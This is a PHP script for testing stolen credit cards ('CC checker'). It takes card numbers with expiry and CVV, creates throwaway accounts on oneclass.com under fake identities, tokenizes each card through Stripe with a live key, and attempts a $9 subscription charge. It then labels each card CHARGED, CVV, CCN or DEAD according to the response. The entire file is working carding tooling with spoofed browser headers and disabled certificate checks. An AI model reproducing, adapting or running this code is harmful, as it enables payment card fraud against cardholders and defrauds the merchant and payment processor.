<?php

//================[Functions and Variables]================//


error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


$last4 = substr($cc, -4);



function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 


//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://oneclass.com/oc_api/api/users/signup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /oc_api/api/users/signup';
$headers[] = 'Host: oneclass.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'sec-ch-ua: "Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/json';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Origin: https://oneclass.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://oneclass.com/signup.en.html';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"user":{"email":"'.$email.'","password":"'.$pass.'"},"request_origin":null,"email_subscribe":false,"current_url":"/signup.en.html"}');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result1 = curl_exec($ch);
//=======================[1 REQ-END]==============================//

//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://oneclass.com/api/users/set_school');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /api/users/set_school';
$headers[] = 'Host: oneclass.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'sec-ch-ua: "Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/json';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Origin: https://oneclass.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://oneclass.com/signup.en.html';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"school_id":"3190","full_name":" ","nickname":"'.$un.'","year":2,"highest_degree":null,"main_categories":[],"join_mailing_list":false,"email_subscribe":null,"source":null,"avatar":""}');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result2 = curl_exec($ch);
//=======================[2 REQ-END]==============================//

//=======================[3 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://oneclass.com/api/users/set_school');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /api/users/set_school';
$headers[] = 'Host: oneclass.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'sec-ch-ua: "Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/json';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Origin: https://oneclass.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://oneclass.com/signup.en.html';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"school_id":"3190","full_name":" ","nickname":"'.$un.'","year":2,"highest_degree":null,"main_categories":[],"join_mailing_list":false,"email_subscribe":null,"source":null,"avatar":""}');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result3 = curl_exec($ch);
//=======================[3 REQ-END]==============================//

//=======================[4 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /v1/tokens';
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'sec-ch-ua: "Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://js.stripe.com';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$firstname.'+'.$lastname.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=9a4a33ac-0b1e-4d51-b291-bd40e37a411989ab12&muid=573ca2da-5615-49af-b796-bea280290b53aa461b&sid=bb84f204-5e21-4355-ba08-a2e50bb9d9e24bcb68&payment_user_agent=stripe.js%2F0663df7b8%3B+stripe-js-v3%2F0663df7b8&time_on_page=28602&key=pk_live_aNfPjQErHdOZp2X4UIgznIV5');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result4 = curl_exec($ch);
$id = trim(strip_tags(getStr($result4,'"id": "','"'))); 
//=======================[4 REQ-END]==============================//

//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://oneclass.com/hw_api/api/react/payments/one_click_payment');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /hw_api/api/react/payments/one_click_payment';
$headers[] = 'Host: oneclass.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'sec-ch-ua: "Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/json';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Origin: https://oneclass.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://oneclass.com/signup.en.html';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_method":"card","name_on_card":"'.$firstname.' '.$lastname.'","current_url":"%2Fpurchases%2Fhw-plus.en.html%3Fsource%3Dsettings%26selected_plan_id%3Dhw_unlimited_yearly_nov_2019","timezone_offset":-6,"from":"settings","email":"","stripe_plan_id":"hw_unlimited_monthly_jun_2020","free_trial":false,"single_document":false,"token_id":"'.$id.'","source":"settings","code":""}');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result5 = curl_exec($ch);
//=======================[5 REQ-END]==============================//

//=======================[6 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://oneclass.com/logout');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'POST /logout';
$headers[] = 'Host: oneclass.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'sec-ch-ua: "Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/json';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Origin: https://oneclass.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://oneclass.com/settings/manage-subscription.en.html';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result6 = curl_exec($ch);
//=======================[6 REQ-END]==============================//

//=======================[RESPONSES]==============================//
if(strpos($result5, '"payment_success":"true"' )) {
    echo '<br>CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Completed. Charged $9 ✅<br>';
}
elseif(strpos($result5, "Your card's security code is incorrect." )) {
    echo '<br>CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your cards security code is incorrect. ✅<br>';
}
elseif(strpos($result5, "Your card has insufficient funds." )) {
    echo '<br>CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card has insufficient funds. ✅<br>';
}
elseif(strpos($result5, "Your card does not support this type of purchase." )) {
    echo '<br>CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card has insufficient funds. ✅<br>';
}  
else {
    echo '<br>DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: '.$result5.'<br>';
}
//=======================[RESPONSES END]==============================//

/echo $result1;
/echo $result2;
/echo $result3;
/echo $result4;
/echo $result5;
/echo $result6;
curl_close($ch);
ob_flush();
?>
